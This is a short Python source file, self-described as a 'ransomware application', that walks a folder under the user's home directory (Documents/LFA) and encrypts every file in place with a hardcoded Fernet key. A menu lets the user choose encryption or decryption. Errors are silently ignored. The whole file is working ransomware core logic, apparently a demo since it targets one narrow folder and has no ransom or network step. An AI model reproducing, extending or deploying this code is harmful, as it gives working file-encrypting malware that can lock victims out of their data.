from pathlib import Path
from cryptography.fernet import Fernet
from general import *

def encrypt(filee, fernet):
    """Encrypts a file

    Args:
        filee (str): File path
        fernet (obj): Fernet object containing the key
    """
    with open(filee, 'rb') as file: original = file.read()
    encrypted = fernet.encrypt(original)
    with open(filee, 'wb') as encrypted_file: encrypted_file.write(encrypted)

def decrypt(filee, fernet):
    """Decrypts a file

    Args:
        filee (str): File path
        fernet (obj): Fernet object containing the key
    """
    with open(filee, 'rb') as file: content = file.read()
    decrypted = fernet.decrypt(content)
    with open(filee, 'wb') as file: file.write(decrypted)

def showMenu():
    """Show the ransomware application menu

    Returns:
        int: Choosen option
    """
    print('[RANSOMWARE MENU]')
    print('\t1)Encrypt files')
    print('\t2)Decrypt files')
    answer = int(input('Option: '))
    return answer

def main():
    """Ransomware main function
    """
    print('Calculating number of files..')
    #Configure starting path of the ransomware
    path = Path(Path.home()).absolute()
    foldername = path / 'Documents' / 'LFA'
    files = getFiles(foldername)
    #Cryptography key
    fernet = Fernet('bjq5lagsjEDIvxmWM6badVWEFD4wSGVatHaSCoYZqeI=')

    size = len(files)
    print(f'Number of files: {size}\n')

    opt = showMenu()
    while opt != 9:
        if opt == 1: 
            for index,x in enumerate(files):
                output = "Encrypting file " + str(index + 1) + '/' + str(size)
                Printer(output)
                try: encrypt(x, fernet)
                except Exception: pass
            print('\nEncryption process finished\n')
        if opt == 2:
            for index,x in enumerate(files):
                output = "Decrypting file " + str(index + 1) + '/' + str(size)
                Printer(output)
                try: decrypt(x, fernet)
                except Exception: pass
            print('\nDecryption process finished\n')
        opt = showMenu()

if __name__ == '__main__':
    main()